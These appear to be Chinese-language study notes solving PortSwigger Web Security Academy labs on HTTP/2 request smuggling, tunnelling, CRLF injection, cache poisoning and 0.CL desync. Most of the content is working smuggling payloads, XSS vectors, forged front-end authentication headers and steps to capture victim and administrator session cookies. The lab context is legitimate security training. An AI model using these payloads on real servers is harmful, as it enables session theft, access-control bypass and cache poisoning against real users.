# HTTP/2 请求混淆

**前端使用计算长度，后端降级使用头部长度**

### H2.CL 漏洞
实验：H2.CL 请求走私
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling
       

主页加载脚本
```html 
<script type="text/javascript" src="/resources/js/analyticsFetcher.js"></script>
```

GET /resources/js/analyticsFetcher.js HTTP/2

加载的脚本继续加载其他脚本
GET /resources/js/analytics.js?uid=7220293188 HTTP/2

发起连接
GET /analytics?id=U1B36fna4UPgIQS5 HTTP/2


使用主题教程，在首页请求附加请求http2混淆内容
```
Content-Length: 0

GET /404 HTTP/1.1
Host: aaaaaaaaaaaaaaaaaaaaaaaa
Content-Length: 10

x=1
```
第二次响应为
HTTP/2 404 Not Found
"Not Found"

可成功进行http2的走私

> 注意如果你发送请求 GET /resources，你会被重定向到 https://YOUR-LAB-ID.web-security-academy.net/resources/

主页请求修改为
```
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0aee006804d1502481461094011c0013.exploit-server.net
Content-Length: 10

x=1
```
第二次响应为
HTTP/2 302 Found
Location: https://exploit-0aee006804d1502481461094011c0013.exploit-server.net/resources/
成功进行重定向

修改控制服务器路径为
/resources/
头部为
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *
响应体为
alert(document.cookie)

此时持续发送脚本重定向走私请求，直到目标加载脚本时重定向到控制脚本


## 响应队列中毒
实验：通过 H2.TE 请求走私实现响应队列中毒
https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling

使用http2降级，对TE后端服务器走私一个完整的请求
```
POST / HTTP/2
Host: 0ae7005204541400830b3caa00480045.web-security-academy.net
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: 0ae7005204541400830b3caa00480045.web-security-academy.net


```

多次重复后，响应为
```
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=hA3lasphOzcjTHaawdWDJPOgQ2qodahA; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
在浏览器中显示响应，作为管理员登录


## 通过 CRLF 注入进行请求走私
实验：通过 CRLF 注入进行 HTTP/2 请求走私
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection

在重复器中使用查看器
创建name为foo
value为bar的头部
点击箭头符号进入编辑区
在value中使用组合键Shift+Enter，将输入/r/n的二进制形式
尝试添加头部，此处[]中的内容表示不可打印字符的二进制形式
```
bar[\r\n]
Transfer-Encoding: chunked
```

设置请求体为
```
0

POST /404 HTTP/1.1
Host: 0a7d00f5041230418162bb6e00a30071.web-security-academy.net
Content-Length: 10

x=1
```
在第二次请求中可成功触发404，但队列中毒似乎不可行

使用搜索功能后主页的响应为
```
<label>Recent searches:</label>
<ul>
<li><a href="/?search=a">a</a></li>
</ul>
```
搜索的内容被保存到同一会话中

尝试使用走私的搜索请求头将目标用户的头部反映到搜索功能中
使用一个得到的cookie，以查看保存的走私内容，跳转CL值以显示令牌
```
0

POST / HTTP/1.1
Host: 0a7d00f5041230418162bb6e00a30071.web-security-academy.net
Cookie: session=iaryAf9gZbUgueneDsXegB8B049J48Jj
Content-Length: 900

search=
```
最后得到
```
GET / HTTP/1.1
Host: 0a7d00f5041230418162bb6e00a30071.web-security-academy.net
sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;Linux&quot;
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-fetch-site: none
sec-fetch-mode: navigate
sec-fetch-user: ?1
sec-fetch-dest: document
accept-encoding: gzip, deflate, br, zstd
accept-language: en-US,en;q=0.9
priority: u=0, i
cookie: victim-fingerprint=cdwE922upM4vRegLFowHT2Wlr0vKACDm; secret=J1422oxkihnkKNC6Rle53v8Z9ihQTCEO; session=bBcGZhVcJzvcA0kTy1XA0mYwaSJpm7EW; _lab_analytics=poAuh4Rtf0yb0LCAGRjA3tvW1JxORDNqGCrl5NgcBZqqCC2qF9dQcDrfqg
```
使用得到的目标用户cookie登录

## HTTP/2 请求拆分
实验：通过 CRLF 注入进行 HTTP/2 请求拆分
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection

在重复器中使用查看器
创建name为foo
value为bar的头部
点击箭头符号进入编辑区
在value中使用组合键Shift+Enter，将输入/r/n的二进制形式
此处[]中的内容表示不可打印字符的二进制形式
使用主题教程的前端重写
```
bar[\r\n]
host: 0a1700c704f931a980e903c3008e0092.web-security-academy.net[\r\n]
[\r\n]
GET /404 HTTP/1.1
```
后续可成功得到404响应
重复发送直到获取目标用户头部
```
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=Fajox7dH4YMmjWxHztctaB4LwYO5ykng; Secure; HttpOnly; SameSite=None
```
在浏览器中显示响应，使用会话令牌作为管理员登录

## HTTP 请求隧道
### 通过 HTTP/2 请求隧道化泄露内部头部信息 & 使用 HEAD 进行非盲请求隧道
实验：通过 HTTP/2 请求隧道绕过访问控制
https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling

将搜索功能的
GET /?search=a HTTP/2
修改方法为
POST / HTTP/2

search=a
仍可运行

此处无法使用头部的属性值设置头部，但可使用属性设置头部
name
``` 
foo: bar[\r\n]
Content-Length: 500[\r\n]
[\r\n]
search=
```
value
```
bar
```

结构为：
走私头部
走私search请求体
前端追加请求头
原请求体

设置走私请求头部的CL以覆盖想要获取的前端追加请求头的长度，
确保 走私search请求体 + 前端追加请求头 + 原请求体 >= 走私头部CL长度
设置原请求体的额外字符确保覆盖走私头部的CL长度

响应为
```
0 search results for ': bar
content-type: application/x-www-form-urlencoded
Content-Length: 288
cookie: session=iQ3F3WnZ22lPvYOaZ6qcx494N2jmbx6j
X-SSL-VERIFIED: 0
X-SSL-CLIENT-CN: null
X-FRONTEND-KEY: 6195488116296770

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
```

修改得到的前端属性值为：验证=1，名称=administrator
```
foo: bar[\r\n]
X-SSL-VERIFIED: 1[\r\n]
X-SSL-CLIENT-CN: administrator[\r\n]
X-FRONTEND-KEY: 6195488116296770[\r\n]
[\r\n]
```
响应中包含管理员面板

示例解决方案在此处使用 HEAD 进行非盲请求隧道，而不是直接将令牌以二进制方式注入
外部使用HEAD方法，前端服务器将根据响应中的 Content-Length 进行转发。于是在设置走私路径后相应调整HEAD的路径
HEAD路径的响应 < 走私响应
根据响应确定执行目标操作所需url，修改走私url


### 通过 HTTP/2 请求隧道进行 Web 缓存投毒
实验：通过 HTTP/2 请求隧道进行 Web 缓存投毒
https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling

外部使用对主页的GET，响应的内容格式为html
在内部的响应注入脚本的html标记

对资源请求的重定向中发现反射XSS
```html
GET /resources?<svg/onload=alert(1)> HTTP/2
```
```html
HTTP/2 302 Found
Location: /resources/?<svg/onload=alert(1)>
```

使用HEAD方法
此处无法在自定义头部的属性与属性值中进行走私
尝试伪协议头部
:method 可走私，但无法缓存
:path 可走私，可缓存

name
```
:path
```

value
```
/ HTTP/1.1[\r\n]
[\r\n]
GET / HTTP/1.1[\r\n]
foo: bar
```

由于要填充HEAD方法的CL，除使用之前的反射XSS响应外，再走私其他内容进行填充
```html
/ HTTP/1.1[\r\n]
[\r\n]
GET /resources?<svg/onload=alert(1)> HTTP/1.1[\r\n]
[\r\n]
GET / HTTP/1.1[\r\n]
foo: bar
```

最终得到三重响应
首页 + XSS + 填充
```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=9atYoM82HjDCkD2NiVgcUQRiBX3rawg9; Secure; HttpOnly; SameSite=None
Content-Length: 8693
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss

HTTP/1.1 302 Found
Location: /resources/?<svg/onload=alert(1)>
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=0
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=0
Content-Length: 8693

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <title>Web cache poisoning via HTTP/2 request tunnelling</title>
    </head>
```

> 从代理历史记录中检查正常 GET / 请求的响应中的 Content-Length，并记下其值。
> 回到 Burp Repeater 中的恶意请求，在闭合的 </script> 标签后添加足够的任意字符来填充你的反射载荷，使得隧道响应的长度超过刚才记下的 Content-Length。



## 0. CL 请求走私
实验：0.CL 请求走私
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling
关联
文章 HTTP/1.1 Must Die
https://portswigger.net/research/http1-must-die
结合示例解决方案的视频

请求详情页面时
GET /post?postId=8 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
响应反射浏览器代理头部
```html
<input required type="hidden" name="userAgent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0">
```
此处存在反射XSS
```html
User-Agent: "><svg onload=alert(1)-"
```
```html
<input required type="hidden" name="userAgent" value=""><svg onload=alert(1)-"">
```

设置攻击头部
GET /post?postId=8 HTTP/1.1
Host: 0aee00c70426a1ab806ae437002d007b.web-security-academy.net
User-Agent: "><svg onload=alert(1)-"
foo: bar

在首页使用 HTTP Request Smuggling 扩展，对前后端差异进行扫描
选择-报告到组织器，取消-研究模式
对重复Host头的缩进导致响应不同
Host: foo/bar
Host : foo/bar

在主页转为POST方法，使用CL头部继续研究
```
Content-Length : 1

x
```
导致死锁超时，分析为后端等待CL内容，而前端忽略CL

寻找解除死锁的方式
设置CL死锁的同时对静态资源目录进行测试
POST /resources/images/blog.svg HTTP/1.1
此时可返回而无死锁

设置包含请求，第一个请求将导致后端等待44个字节
在第二次发送时，将移除至第二个请求前，从而执行
此处的两个请求均使用无死锁url
多次重试后请求将响应js内容
```
GET /resources/images/blog.svg HTTP/1.1
X: GET /resources/labheader/js/labHeader.js HTTP/1.1
Host: 0ad700710365baba803e854500c2001b.web-security-academy.net
Content-Length : 44


```

结合之前的XSS页面，稍作调整，将CL放到前面截断
```
GET /resources/images/blog.svg HTTP/1.1
Content-Length : 65
X: GET /post?postId=8 HTTP/1.1
Host: 0ad700710365baba803e854500c2001b.web-security-academy.net
User-Agent: "><svg onload=alert(1)-"


```
多次重复后，将返回第二个XSS页面

将0-CL转为CL：
第一个请求构建解除死锁的CL请求，此处为静态资源，后端立即对此请求响应，但后端等待后续CL
```
POST /resources/images/blog.svg HTTP/1.1
Content-Length : 44
Host: 0ad700710365baba803e854500c2001b.web-security-academy.net


```

第二个请求多步构建————
第一部分，设置一个填充头部，对应后端对第一个请求的CL，并设置第二个请求本身的普通CL
第二部分，设置另一个填充头部，后端立即对第二个请求响应
两组 /r/n 后端将此作为新的请求头部
第三部分，设置攻击头部，此处使用对 User-Agent 的反射XSS。设置走私CL将攻击向量返回到目标用户
```
GET /aa HTTP/1.1
Content-Length: 156
foo: GET / HTTP/1.1
Host: 0ad700710365baba803e854500c2001b.web-security-academy.net

GET /post?postId=8 HTTP/1.1
Host: 0ad700710365baba803e854500c2001b.web-security-academy.net
User-Agent: "><svg onload=alert(1)-"
Content-Length: 10

x=
```
将两个请求加入组或者发送到攻击器后设置宏，多次重复后成功
此处使用单独的攻击头部是由于可能出现重复的 User-Agent 头部导致失败，否则只需设置方法头与用来抵消后续请求头的自定义头


文章与视频的示例使用前一个lab使用的：
HEAD头设置HTML响应 + 静态资源302重定向的XSS反射
将静态资源重定向内容的标签作为HTML标记解析
```
HEAD /index.asp HTTP/1.1
Host: <redacted>

GET /?<script>alert(1 HTTP/1.1
X: Y
```
此处由自定义头部X消除要攻击的后续方法头部的作用，将其设置为头部的值
其余部分不必改动
根据Host头响应的CL，在重定向中进行字符填充